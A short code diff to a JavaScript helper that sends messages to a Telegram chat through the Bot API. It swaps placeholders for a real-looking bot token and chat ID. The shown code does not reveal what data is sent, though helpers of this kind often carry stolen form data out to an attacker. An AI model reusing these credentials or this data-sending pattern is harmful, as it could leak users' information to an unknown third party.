@@ -2,8 +2,8 @@
 
 // Helper function to send data to Telegram
 function sendToTelegram(message) {
-    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
+    const telegramBotToken = '8017126313:AAHj1jxhYZpLKOsLcXLRsDdwf8ydmkN7TyE';
+    const chatId = '7066870800';
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
     fetch(url, {
         method: 'POST',
